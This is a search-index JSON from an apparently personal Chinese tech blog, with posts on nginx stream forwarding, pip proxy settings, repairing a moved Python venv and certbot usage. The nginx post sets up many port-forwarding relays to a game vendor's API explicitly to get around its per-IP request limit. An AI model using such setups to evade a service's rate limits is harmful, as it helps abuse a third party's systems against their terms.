{"config":{"lang":["ja"],"separator":"[\\s\\-\uff0c\u3002]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u4e3b\u9875","text":"<p>\u6458\u8981</p> <p>\u8fd9\u91cc\u662f \u79cb\u8449\u4e9c\u91cc\u6c99 \u7684\u4e2a\u4eba\u535a\u5ba2\u3002</p> <p>\u4e3b\u8981\u8bb0\u5f55\u5206\u4eab\u4e00\u4e9b\u5b66\u4e60\u548c\u751f\u6d3b\u8fc7\u7a0b\u4e2d\u7684\u70b9\u6ef4\u3002</p> <p>\u8be5\u535a\u5ba2\u5747\u4e3a\u5b9e\u9a8c\u6027\u5185\u5bb9\uff0c\u4e0d\u4ee3\u8868\u4ee5\u540e\u6700\u7ec8\u6210\u54c1\u3002</p> <p>\u76ee\u5f55  \u6807\u7b7e </p>"},{"location":"#_2","title":"\u5173\u4e8e\u6211","text":"<ul> <li>\u672c\u79d1\u975e\u8ba1\u79d1\uff0c\u56e0\u7231\u597d\u800c\u5b66\u4e60\u8ba1\u7b97\u673a\u76f8\u5173\u77e5\u8bc6\uff0c\u6700\u4e3b\u8981\u4f7f\u7528\u7684\u7a0b\u5e8f\u8bed\u8a00\u662f Python\u3002</li> <li>\u76ee\u524d\u5df2\u7ecf\u6bd5\u4e1a\uff0c\u6b63\u5728\u4e8c\u6218\u8003\u7814\u3002</li> <li>\u559c\u6b22\u97f3\u6e38\uff0c\u76ee\u524d\u6b63\u5728\u73a9\u7684\u662f\u90a6\u90a6\u548c Arcaea\u3002</li> <li>\u5728\u5176\u4ed6\u670b\u53cb\u7684\u5e26\u9886\u4e0b\uff0c\u73b0\u5728\u8ff7\u4e0a\u4e86 Bot \u5f00\u53d1\u3001\u670d\u52a1\u5668\u8fd0\u7ef4\u4ee5\u53ca\u9006\u5411\u5de5\u7a0b\u3002</li> <li>\u957f\u671f\u63a5\u90a6\u90a6\u4ee3\u6253\u3002</li> </ul>"},{"location":"#_3","title":"\u53cb\u60c5\u94fe\u63a5","text":"<ul> <li>HEAVENLYHEAVEN - NUIK BLOG</li> <li>MBR's Blog</li> <li>InariAimu's Blog</li> <li>Akula&lt;&gt;Blog</li> <li>Atmosphere</li> <li>Awblogu</li> <li>BsBlog</li> </ul>"},{"location":"tags/","title":"\u6807\u7b7e","text":"<p>{{ tag_content }}</p>"},{"location":"toc/","title":"\u76ee\u5f55","text":"<p>{{ blog_content }}</p>"},{"location":"blog/2022/220406-nginx-stream/","title":"nginx \u5982\u4f55\u8bbe\u7f6e stream \u8f6c\u53d1","text":"","tags":["nginx","arcaea"]},{"location":"blog/2022/220406-nginx-stream/#_1","title":"\u80cc\u666f","text":"<p>\u5e2e aw \u505a AUA \u8f6c\u53d1\u8282\u70b9\u7684\u65f6\u5019\u9047\u5230\u4e86\u8fd9\u4e2a\u9700\u6c42\uff0c\u56e0\u4e3a AUA \u9700\u8981\u9891\u7e41\u5411 616 \u8bf7\u6c42 API\uff0c\u4f46\u662f 616 \u5bf9 \u540c\u4e00\u4e2a IP \u7684\u8bf7\u6c42\u6570\u91cf\u6709\u9650\u5236\uff0c\u6240\u4ee5 AUA \u9700\u8981\u5927\u91cf\u7684\u8f6c\u53d1\u8282\u70b9\u6765\u7ef4\u6301\u4f7f\u7528\u3002</p> <p>aw \u7684\u5efa\u8bae\u662f\u7528 <code>socat</code> (Linux server) \u6216\u8005 <code>netsh</code> (Windows server)</p> Linux serverWindows server <pre><code>socat -d TCP4-LISTEN:6161,reuseaddr,fork TCP4:arcapi-v2.lowiro.com:443\n</code></pre> <pre><code>netsh interface portproxy add v4tov4 listenport=6161 connectaddress=arcapi-v2.lowiro.com connectport=443\n</code></pre> <p>\u95ee\u9898\u662f\u6211\u670d\u52a1\u5668\u4e0a\u5df2\u7ecf\u6709 <code>nginx</code> \u4e86\uff0c\u4e0d\u662f\u5f88\u60f3\u88c5 <code>socat</code>\u3002</p>","tags":["nginx","arcaea"]},{"location":"blog/2022/220406-nginx-stream/#_2","title":"\u521d\u6b21\u5c1d\u8bd5","text":"<p>\u4e86\u89e3\u5230 <code>nginx</code> \u4ece <code>1.9.0</code> \u5f00\u59cb\uff0c\u65b0\u589e\u52a0\u4e86\u4e00\u4e2a stream \u6a21\u5757\uff0c\u7528\u6765\u5b9e\u73b0\u56db\u5c42\u534f\u8bae\u7684\u8f6c\u53d1\u3001\u4ee3\u7406\u6216\u8005\u8d1f\u8f7d\u5747\u8861\u7b49\u3002\u7528\u6cd5\u662f\u76f4\u63a5\u5728 <code>nginx.conf</code> \u4e2d\u914d\u7f6e <code>stream</code> \u5b57\u6bb5\u3002</p> <p>\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u5b8c\u6210\u540e\u53d1\u73b0\uff0cnginx \u5e76\u4e0d\u8ba4\u8bc6 stream \u6a21\u5757\u3002\u4f7f\u7528 <code>nginx -t</code> \u68c0\u67e5\u914d\u7f6e\u65e0\u6cd5\u901a\u8fc7\u3002\u62a5\u9519\u63d0\u793a <code>unknown directive \"stream\" in /etc/nginx/nginx.conf</code>\u3002</p> <p>\u540e\u6765\u4e86\u89e3\u5230\uff0c\u5982\u679c\u9700\u8981\u4f7f nginx \u5185\u7f6e\u652f\u6301 stream \u6a21\u5757\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a <code>--with-stream</code> \u9009\u9879\u3002\u5373</p> <pre><code>./configure --with-stream\n</code></pre> <p>\u5b98\u7f51\u7684\u8bf4\u6cd5</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u5b9e\u5c5e\u8fc7\u4e8e\u9ebb\u70e6\uff0c\u8fd8\u8981\u91cd\u88c5 nginx\u3002</p>","tags":["nginx","arcaea"]},{"location":"blog/2022/220406-nginx-stream/#_3","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e86\u89e3\u5230\u4e86\u4e0d\u7528\u91cd\u65b0\u7f16\u8bd1\u4e5f\u80fd\u652f\u6301 stream \u6a21\u5757\u7684\u65b9\u6cd5\uff1a</p> <p>unknown directive \"stream\" in /etc/nginx/nginx.conf:86 - Server Fault</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\uff0c\u5373\u4f7f\u6211\u4eec\u6ca1\u6709\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a <code>--with-stream</code> \u9009\u9879\uff0cnginx \u4e5f\u4f1a\u5c06 stream \u6a21\u5757\u7f16\u8bd1\u8fdb\u6765\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8ba9 nginx \u9ed8\u8ba4\u652f\u6301\uff0c\u800c\u662f\u9700\u8981\u6211\u4eec\u81ea\u884c\u5bfc\u5165\uff0c\u5373\uff1a</p> <pre><code>load_module /usr/lib/nginx/modules/ngx_stream_module.so;\n</code></pre> <p>\u5982\u6b64\u4e00\u6765\u4fbf\u80fd\u6b63\u5e38\u4f7f\u7528 stream \u6a21\u5757\u3002</p>","tags":["nginx","arcaea"]},{"location":"blog/2022/220406-set-http-proxy/","title":"\u89e3\u51b3\u4f7f\u7528\u4ee3\u7406\u540e pip \u548c python \u65e0\u6cd5\u8fde\u63a5\u5230\u7f51\u7edc\u7684\u95ee\u9898","text":"","tags":["python","pip","proxy"]},{"location":"blog/2022/220406-set-http-proxy/#_1","title":"\u95ee\u9898","text":"<p>\u5f00\u542f\u7cfb\u7edf\u4ee3\u7406\u540e\uff0c\u5f53\u4f7f\u7528 pip \u5b89\u88c5\u5305\u65f6\uff0c\u4f1a\u62a5\u9519\uff1a</p> <pre><code>ValueError: check_hostname requires server_hostname\n</code></pre> <p>\u4ee5\u53ca\u4f7f\u7528\u67d0\u4e9b\u7f51\u7edc\u64cd\u4f5c\u5e93\u65f6\uff08\u6bd4\u5982 <code>requests</code>\uff09\u4e5f\u4f1a\u62a5\u8fd9\u4e2a\u9519\u3002</p>","tags":["python","pip","proxy"]},{"location":"blog/2022/220406-set-http-proxy/#_2","title":"\u89e3\u51b3\u65b9\u6cd5","text":"<p>\u5728\u63a7\u5236\u53f0\u8fd0\u884c python \u811a\u672c\u524d\u5148\u6307\u5b9a\u4ee3\u7406\u5730\u5740\uff1a</p> <pre><code>set http_proxy=http://127.0.0.1:8889\nset https_proxy=http://127.0.0.1:8889\n</code></pre> <p>\u5176\u4e2d <code>127.0.0.1:8889</code> \u662f\u4ee3\u7406\u670d\u52a1\u5668\u7684\u5730\u5740</p>","tags":["python","pip","proxy"]},{"location":"blog/2022/220406-venv-move-file/","title":"\u79fb\u52a8 python \u9879\u76ee\u6587\u4ef6\u5939\u4f4d\u7f6e\u540e\u5982\u4f55\u89e3\u51b3 PyCharm \u627e\u4e0d\u5230\u89e3\u91ca\u5668\u4e0e\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u7ec8\u7aef\u7684\u95ee\u9898","text":"","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220406-venv-move-file/#_1","title":"\u80cc\u666f","text":"<p>\u56e0\u4e3a\u9879\u76ee\u9700\u8981\uff0c\u5c06\u90e8\u5206 python \u9879\u76ee\u79fb\u52a8\u5230\u4e86\u5176\u4ed6\u6587\u4ef6\u5939\uff0c\u5bfc\u81f4\u5728 PyCharm \u4e2d\u627e\u4e0d\u5230\u89e3\u91ca\u5668\uff0c\u4e5f\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u7ec8\u7aef\u3002</p>","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220406-venv-move-file/#_2","title":"\u73b0\u8c61","text":"<p>\u6211\u4f7f\u7528\u7684 IDE \u662f <code>PyCharm \u4e13\u4e1a\u7248 2021.3.2</code>\uff0c\u5177\u4f53\u8868\u73b0\u4e3a\u5728 IDE \u5185\u6253\u5f00\u7ec8\u7aef\u540e\uff1a</p> <ul> <li>PyCharm \u627e\u4e0d\u5230\u89e3\u91ca\u5668</li> <li>\u7ec8\u7aef\u5185\u6267\u884c python \u7a0b\u5e8f\u53ea\u80fd\u591f\u4f7f\u7528\u5168\u5c40\u5305</li> <li>\u65e0\u6cd5\u8fdb\u5165 venv \u73af\u5883\uff08\u5305\u62ec PyCharm \u81ea\u52a8\u8fdb\u5165\u548c\u624b\u52a8\u8fdb\u5165\uff09</li> <li>\u65e0\u6cd5\u4f7f\u7528 pip</li> </ul>","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220406-venv-move-file/#_3","title":"\u89e3\u51b3","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u597d\u89e3\u51b3\uff0cPyCharm \u4f1a\u81ea\u52a8\u68c0\u6d4b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 venv \u6587\u4ef6\u5939\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u4f1a\u5c06 <code>venv/Scripts/python</code> \u8bbe\u7f6e\u4e3a\u89e3\u91ca\u5668\u3002\u95ee\u9898\u76f4\u63a5\u89e3\u51b3\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u79fb\u52a8\u4e86 python \u9879\u76ee\u6587\u4ef6\u5939\u7684\uff0c\u56e0\u6b64\u539f\u6765\u7684\u89e3\u91ca\u5668\u8def\u5f84\u8fd8\u4fdd\u7559\u5728 PyCharm \u5185\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5c06\u5176\u5220\u9664\u3002\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u64cd\u4f5c\uff1a</p> <p>\u627e\u5230 <code>\u6587\u4ef6</code> -&gt; <code>\u8bbe\u7f6e</code> -&gt; <code>\u9879\u76ee</code> -&gt; <code>Python \u89e3\u91ca\u5668</code></p> <p>\u9009\u62e9\u5f53\u524d\u89e3\u91ca\u5668\u53f3\u8fb9\u7684\u9f7f\u8f6e\u56fe\u6807\uff0c\u70b9\u51fb <code>\u5168\u90e8\u663e\u793a</code>\uff0c\u627e\u5230\u7ea2\u8272\u6807\u8bb0\u7684\u89e3\u91ca\u5668\uff0c\u70b9\u51fb\u5220\u9664\u5373\u53ef\u3002</p> <p>\u5177\u4f53\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8868\u73b0\uff1a</p> <ol> <li> <p>\u81ea\u5df1\u7684\u5b9e\u9645\u9879\u76ee\u4e2d\u6709\u7b2c\u4e09\u65b9\u5e93\uff08\u4f8b\u5982 <code>aiohttp</code>\uff09\uff0c\u9879\u76ee\u6587\u4ef6\u76f4\u63a5\u53f3\u952e\u8fd0\u884c\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u4f46\u662f\u5728\u7ec8\u7aef\u91cc\u9762\u6267\u884c\u65f6\u4f1a\u62a5\u9519\uff0c\u63d0\u793a <code>ModuleNotFoundError: No module named 'aiohttp'</code>\u3002</p> </li> <li> <p>\u7ec8\u7aef\u91cc\u76f4\u63a5\u6267\u884c <code>where python</code> \u663e\u793a\u7684\u662f\u5168\u5c40 python \u8def\u5f84\uff0c\u800c\u4e0d\u662f venv \u4e2d\u7684\u8def\u5f84\u3002</p> </li> <li> <p>\u7ec8\u7aef\u91cc\u76f4\u63a5\u6267\u884c <code>pip list</code> \u4f1a\u63d0\u793a\u53ea\u6709 <code>pip</code> \u548c <code>setuptools</code> \u4e24\u4e2a\u5305\uff0c\u800c\u6211\u4eec\u9879\u76ee\u91cc\u4f9d\u8d56\u7684\u5305\u4e00\u4e2a\u90fd\u6ca1\u6709\u3002</p> </li> </ol> <p>\u539f\u56e0\u5728\u4e8e PyCharm \u81ea\u52a8\u8fdb\u5165 venv \u73af\u5883\u7684\u65f6\u5019\u662f\u4ece <code>venv/Scripts/activate.bat</code> \u8fdb\u5165\u7684\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5b9a\u4e49\u4e86 <code>%PATH%</code>\uff0c\u5f53\u6211\u4eec\u5df2\u7ecf\u79fb\u52a8\u4e86\u9879\u76ee\u6587\u4ef6\u5939\u540e\uff0c<code>activate.bat</code> \u91cc\u8bb0\u5f55\u7684\u8def\u5f84\u5e76\u6ca1\u6709\u6539\uff0c\u800c\u539f\u6765\u7684\u8def\u5f84\u5df2\u7ecf\u4e0d\u5b58\u5728\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u653e\u5728 <code>venv</code> \u4e0b\u7684 <code>python.exe</code> \u5e76\u4e0d\u4f1a\u81ea\u52a8\u8fdb\u5165\u5230 <code>%PATH%</code> \u4e2d\u3002</p> <p>\u89e3\u51b3\u65b9\u5f0f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u7f16\u8f91 <code>venv/Scripts/activate.bat</code> \u6587\u4ef6\uff0clinux \u540c\u7406\u3002</p> CMDBashFishShellXonsh activate.bat<pre><code>@echo off\n\nset \"VIRTUAL_ENV=I:\\Developer\\web\\blog_mkdocs\\venv\"\nif defined _OLD_VIRTUAL_PROMPT (\n    set \"PROMPT=%_OLD_VIRTUAL_PROMPT%\"\n) else (\n    if not defined PROMPT (\n        set \"PROMPT=$P$G\"\n    )\n    if not defined VIRTUAL_ENV_DISABLE_PROMPT (\n        set \"_OLD_VIRTUAL_PROMPT=%PROMPT%\"\n    )\n)\nif not defined VIRTUAL_ENV_DISABLE_PROMPT (\n    set \"ENV_PROMPT=\"\n    if NOT DEFINED ENV_PROMPT (\n        for %%d in (\"%VIRTUAL_ENV%\") do set \"ENV_PROMPT=(%%~nxd) \"\n    )\n    )\n    set \"PROMPT=%ENV_PROMPT%%PROMPT%\"\n)\n\nREM Don't use () to avoid problems with them in %PATH%\nif defined _OLD_VIRTUAL_PYTHONHOME goto ENDIFVHOME\n    set \"_OLD_VIRTUAL_PYTHONHOME=%PYTHONHOME%\"\n:ENDIFVHOME\n\nset PYTHONHOME=\n\nREM if defined _OLD_VIRTUAL_PATH (\nif not defined _OLD_VIRTUAL_PATH goto ENDIFVPATH1\n    set \"PATH=%_OLD_VIRTUAL_PATH%\"\n:ENDIFVPATH1\nREM ) else (\nif defined _OLD_VIRTUAL_PATH goto ENDIFVPATH2\n    set \"_OLD_VIRTUAL_PATH=%PATH%\"\n:ENDIFVPATH2\n\nset \"PATH=%VIRTUAL_ENV%\\Scripts;%PATH%\"\n</code></pre> activate<pre><code># This file must be used with \"source bin/activate\" *from bash*\n# you cannot run it directly\n\n\nif [ \"${BASH_SOURCE-}\" = \"$0\" ]; then\necho \"You must source this script: \\$ source $0\" &gt;&amp;2\nexit 33\nfi\n\ndeactivate () {\nunset -f pydoc &gt;/dev/null 2&gt;&amp;1 || true\n\n# reset old environment variables\n# ! [ -z ${VAR+_} ] returns true if VAR is declared at all\nif ! [ -z \"${_OLD_VIRTUAL_PATH:+_}\" ] ; then\nPATH=\"$_OLD_VIRTUAL_PATH\"\nexport PATH\n        unset _OLD_VIRTUAL_PATH\n    fi\nif ! [ -z \"${_OLD_VIRTUAL_PYTHONHOME+_}\" ] ; then\nPYTHONHOME=\"$_OLD_VIRTUAL_PYTHONHOME\"\nexport PYTHONHOME\n        unset _OLD_VIRTUAL_PYTHONHOME\n    fi\n\n# The hash command must be called to get it to forget past\n# commands. Without forgetting past commands the $PATH changes\n# we made may not be respected\nhash -r 2&gt;/dev/null\n\n    if ! [ -z \"${_OLD_VIRTUAL_PS1+_}\" ] ; then\nPS1=\"$_OLD_VIRTUAL_PS1\"\nexport PS1\n        unset _OLD_VIRTUAL_PS1\n    fi\n\nunset VIRTUAL_ENV\n    if [ ! \"${1-}\" = \"nondestructive\" ] ; then\n# Self destruct!\nunset -f deactivate\n    fi\n}\n\n# unset irrelevant variables\ndeactivate nondestructive\n\nVIRTUAL_ENV='I:\\Developer\\web\\blog_mkdocs\\venv'\nif ([ \"$OSTYPE\" = \"cygwin\" ] || [ \"$OSTYPE\" = \"msys\" ]) &amp;&amp; $(command -v cygpath &amp;&gt; /dev/null) ; then\nVIRTUAL_ENV=$(cygpath -u \"$VIRTUAL_ENV\")\nfi\nexport VIRTUAL_ENV\n\n_OLD_VIRTUAL_PATH=\"$PATH\"\nPATH=\"$VIRTUAL_ENV/Scripts:$PATH\"\nexport PATH\n\n# unset PYTHONHOME if set\nif ! [ -z \"${PYTHONHOME+_}\" ] ; then\n_OLD_VIRTUAL_PYTHONHOME=\"$PYTHONHOME\"\nunset PYTHONHOME\nfi\n\nif [ -z \"${VIRTUAL_ENV_DISABLE_PROMPT-}\" ] ; then\n_OLD_VIRTUAL_PS1=\"${PS1-}\"\nif [ \"x\" != x ] ; then\nPS1=\"${PS1-}\"\nelse\nPS1=\"(`basename \\\"$VIRTUAL_ENV\\\"`) ${PS1-}\"\nfi\nexport PS1\nfi\n\n# Make sure to unalias pydoc if it's already there\nalias pydoc 2&gt;/dev/null &gt;/dev/null &amp;&amp; unalias pydoc || true\n\npydoc () {\npython -m pydoc \"$@\"\n}\n\n# The hash command must be called to get it to forget past\n# commands. Without forgetting past commands the $PATH changes\n# we made may not be respected\nhash -r 2&gt;/dev/null\n</code></pre> activate.fish<pre><code># This file must be used using `source bin/activate.fish` *within a running fish ( http://fishshell.com ) session*.\n# Do not run it directly.\n\nfunction _bashify_path -d \"Converts a fish path to something bash can recognize\"\n    set fishy_path $argv\n    set bashy_path $fishy_path[1]\n    for path_part in $fishy_path[2..-1]\n        set bashy_path \"$bashy_path:$path_part\"\n    end\n    echo $bashy_path\nend\n\nfunction _fishify_path -d \"Converts a bash path to something fish can recognize\"\n    echo $argv | tr ':' '\\n'\nend\n\nfunction deactivate -d 'Exit virtualenv mode and return to the normal environment.'\n    # reset old environment variables\n    if test -n \"$_OLD_VIRTUAL_PATH\"\n        # https://github.com/fish-shell/fish-shell/issues/436 altered PATH handling\n        if test (echo $FISH_VERSION | head -c 1) -lt 3\n            set -gx PATH (_fishify_path \"$_OLD_VIRTUAL_PATH\")\n        else\n            set -gx PATH \"$_OLD_VIRTUAL_PATH\"\n        end\n        set -e _OLD_VIRTUAL_PATH\n    end\n\n    if test -n \"$_OLD_VIRTUAL_PYTHONHOME\"\n        set -gx PYTHONHOME \"$_OLD_VIRTUAL_PYTHONHOME\"\n        set -e _OLD_VIRTUAL_PYTHONHOME\n    end\n\n    if test -n \"$_OLD_FISH_PROMPT_OVERRIDE\"\n       and functions -q _old_fish_prompt\n        # Set an empty local `$fish_function_path` to allow the removal of `fish_prompt` using `functions -e`.\n        set -l fish_function_path\n\n        # Erase virtualenv's `fish_prompt` and restore the original.\n        functions -e fish_prompt\n        functions -c _old_fish_prompt fish_prompt\n        functions -e _old_fish_prompt\n        set -e _OLD_FISH_PROMPT_OVERRIDE\n    end\n\n    set -e VIRTUAL_ENV\n\n    if test \"$argv[1]\" != 'nondestructive'\n        # Self-destruct!\n        functions -e pydoc\n        functions -e deactivate\n        functions -e _bashify_path\n        functions -e _fishify_path\n    end\nend\n\n# Unset irrelevant variables.\ndeactivate nondestructive\n\nset -gx VIRTUAL_ENV 'I:\\Developer\\web\\blog_mkdocs\\venv'\n# https://github.com/fish-shell/fish-shell/issues/436 altered PATH handling\nif test (echo $FISH_VERSION | head -c 1) -lt 3\n   set -gx _OLD_VIRTUAL_PATH (_bashify_path $PATH)\nelse\n    set -gx _OLD_VIRTUAL_PATH \"$PATH\"\nend\nset -gx PATH \"$VIRTUAL_ENV\"'/Scripts' $PATH\n\n# Unset `$PYTHONHOME` if set.\nif set -q PYTHONHOME\n    set -gx _OLD_VIRTUAL_PYTHONHOME $PYTHONHOME\n    set -e PYTHONHOME\nend\n\nfunction pydoc\n    python -m pydoc $argv\nend\n\nif test -z \"$VIRTUAL_ENV_DISABLE_PROMPT\"\n    # Copy the current `fish_prompt` function as `_old_fish_prompt`.\n    functions -c fish_prompt _old_fish_prompt\n\n    function fish_prompt\n        # Run the user's prompt first; it might depend on (pipe)status.\n        set -l prompt (_old_fish_prompt)\n\n        # Prompt override provided?\n        # If not, just prepend the environment name.\n        if test -n ''\n            printf '%s%s' '' (set_color normal)\n        else\n            printf '%s(%s) ' (set_color normal) (basename \"$VIRTUAL_ENV\")\n        end\n\n        string join -- \\n $prompt # handle multi-line prompts\n    end\n\n    set -gx _OLD_FISH_PROMPT_OVERRIDE \"$VIRTUAL_ENV\"\nend\n</code></pre> activate.xsh<pre><code>\"\"\"Xonsh activate script for virtualenv\"\"\"\nfrom xonsh.tools import get_sep as _get_sep\n\ndef _deactivate(args):\n    if \"pydoc\" in aliases:\n        del aliases[\"pydoc\"]\n\n    if ${...}.get(\"_OLD_VIRTUAL_PATH\", \"\"):\n        $PATH = $_OLD_VIRTUAL_PATH\n        del $_OLD_VIRTUAL_PATH\n\n    if ${...}.get(\"_OLD_VIRTUAL_PYTHONHOME\", \"\"):\n        $PYTHONHOME = $_OLD_VIRTUAL_PYTHONHOME\n        del $_OLD_VIRTUAL_PYTHONHOME\n\n    if \"VIRTUAL_ENV\" in ${...}:\n        del $VIRTUAL_ENV\n\n    if \"VIRTUAL_ENV_PROMPT\" in ${...}:\n        del $VIRTUAL_ENV_PROMPT\n\n    if \"nondestructive\" not in args:\n        # Self destruct!\n        del aliases[\"deactivate\"]\n\n\n# unset irrelevant variables\n_deactivate([\"nondestructive\"])\naliases[\"deactivate\"] = _deactivate\n\n$VIRTUAL_ENV = r\"I:\\Developer\\web\\blog_mkdocs\\venv\"\n\n$_OLD_VIRTUAL_PATH = $PATH\n$PATH = $PATH[:]\n$PATH.add($VIRTUAL_ENV + _get_sep() + \"Scripts\", front=True, replace=True)\n\nif ${...}.get(\"PYTHONHOME\", \"\"):\n    # unset PYTHONHOME if set\n    $_OLD_VIRTUAL_PYTHONHOME = $PYTHONHOME\n    del $PYTHONHOME\n\n$VIRTUAL_ENV_PROMPT = \"\"\nif not $VIRTUAL_ENV_PROMPT:\n    del $VIRTUAL_ENV_PROMPT\n\naliases[\"pydoc\"] = [\"python\", \"-m\", \"pydoc\"]\n</code></pre> <ul> <li> </li> </ul> <p>\u901a\u8fc7\u4fee\u6539 <code>activate.bat</code> \u4f7f\u5f97\u80fd\u6b63\u5e38\u8fdb\u5165 venv \u73af\u5883\u540e\uff0c\u4f1a\u8fce\u6765\u7b2c\u4e09\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u65e0\u6cd5\u4f7f\u7528 pip \u5b89\u88c5\u5305\u3002</p> <p>\u5177\u4f53\u8868\u73b0\u4e3a\uff0c\u4f7f\u7528 <code>pip</code> \u547d\u4ee4\u540e\uff0c\u7ec8\u7aef\u4f1a\u62a5\u9519\uff1a<code>Fatal error in launcher: unable to create process using: 'XXXXXXX/python.exe' 'XXXXXXXXX/pip.exe'</code>\u3002</p> <p>\u6211\u4e00\u770b\uff0c\u8fd9\u4e2a\u6240\u8c13\u7684 <code>'XXXXXXX/python.exe'</code> \u6b63\u662f\u6211\u4eec\u5728\u79fb\u52a8\u9879\u76ee\u6587\u4ef6\u4e4b\u524d\u7684 venv \u7684 python \u8def\u5f84\uff0c\u53ef\u662f\u6211\u4eec\u5df2\u7ecf\u4fee\u6539\u4e86 <code>activate.bat</code> \u4e2d\u7684\u8def\u5f84\uff0c\u600e\u4e48\u8fd8\u662f\u4f1a\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\u5462\u3002</p> <p>\u53c2\u8003\u4e86 Fatal error in launcher: Unable to create process using \u8fd9\u7bc7\u6587\u7ae0\uff0c\u4e86\u89e3\u5230 <code>pip.exe</code> \u540c\u6837\u4e5f\u4fdd\u5b58\u4e86\u8def\u5f84\uff0c\u800c\u4e14\u5c31\u4fdd\u5b58\u5728 <code>pip.exe</code> \u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\uff0c\u5982\u679c\u60f3\u8981\u4fee\u6539\u4e5f\u4e0d\u662f\u4e0d\u884c\uff0c\u7528 <code>WinHex</code> \u8fd9\u7c7b\u5de5\u5177\u6539\u5c31\u884c\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u6ca1\u5fc5\u8981\u8fd9\u4e48\u9ebb\u70e6\uff0c\u6211\u7684\u5efa\u8bae\u662f\u76f4\u63a5\u539f\u5730\u91cd\u88c5 <code>pip</code>\uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li> <p>\u9996\u5148\u6709\u4e86\u4e0a\u4e00\u6b65\u7684\u94fa\u57ab\uff0c\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u8fdb\u5165 venv\uff0c\u90a3\u4e48\u8fdb\u5165 venv</p> <pre><code>I:\\Developer\\web\\blog_mkdocs\\venv\\Scripts\\activate.bat\n</code></pre> </li> <li> <p>\u7136\u540e\u91cd\u88c5 <code>pip</code>\uff08\u6ce8\u610f\u6b64\u65f6\u4f60\u5df2\u7ecf\u5728 venv \u91cc\u4e86\uff09</p> <pre><code>python -m pip install --upgrade --force-reinstall pip\n</code></pre> </li> </ol> <p>\u6b64\u65f6\uff0c\u8be5 venv \u91cc\u7684 <code>pip</code> \u5e94\u8be5\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u3002</p> <p>\u540c\u7406\uff0c\u7ee7\u7eed\u68c0\u67e5 <code>venv/Scripts</code> \u4e0b\u7684\u5176\u4ed6\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f8b\u5982 <code>mkdocs.exe</code>\uff0c\u8fd9\u4e9b\u90fd\u8981\u901a\u8fc7\u76f8\u540c\u65b9\u5f0f\u91cd\u88c5\u624d\u80fd\u6b63\u5e38\u7528\u3002</p> <pre><code>pip install --upgrade --force-reinstall mkdocs\n</code></pre>","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220406-venv-move-file/#_4","title":"\u627e\u4e0d\u5230\u89e3\u91ca\u5668","text":"","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220406-venv-move-file/#venv","title":"\u7ec8\u7aef\u53ea\u80fd\u591f\u4f7f\u7528\u5168\u5c40\u5305\u4e0e\u65e0\u6cd5\u8fdb\u5165 venv \u73af\u5883","text":"","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220406-venv-move-file/#pip","title":"\u65e0\u6cd5\u4f7f\u7528 pip","text":"","tags":["python","venv","pycharm","pip"]},{"location":"blog/2022/220407-certbot/","title":"certbot \u5e38\u7528\u64cd\u4f5c","text":"","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_1","title":"\u5b89\u88c5","text":"<p>\u5b98\u7f51\u5efa\u8bae\u7528 <code>snap</code> \u5b89\u88c5\u3002\ud83d\udc49 https://certbot.eff.org/instructions?ws=other&amp;os=ubuntufocal</p> <pre><code>sudo snap install core\nsudo snap refresh core\nsudo snap install --classic certbot\n</code></pre>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_2","title":"\u7533\u8bf7\u591a\u4e2a\u57df\u540d\u8bc1\u4e66","text":"<p>\u8b66\u544a</p> <p>\u65e0\u8bba\u4f60\u9700\u8981\u7533\u8bf7\u591a\u5c11\u4e2a\u8bc1\u4e66\uff0c\u5728\u7533\u8bf7\u4e4b\u524d\uff0c\u90fd\u8bf7\u5728\u4f60\u7684 DNS \u63d0\u4f9b\u5546\u5904\u5c06\u4f60\u6240\u9700\u8981\u7533\u8bf7 SSL \u8bc1\u4e66\u7684\u57df\u540d\u89e3\u6790\u5230\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u3002</p> <p>\u63d0\u793a</p> <p>\u6839\u636e\u4f60\u7684 <code>80</code> \u7aef\u53e3\u6709\u6ca1\u6709\u88ab\u5360\u7528\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e24\u79cd\u6a21\u5f0f\u2014\u2014 <code>nginx</code> \u6216\u8005 <code>standalone</code>\u3002</p> <ul> <li> <p>\u4f60\u7684 <code>80</code> 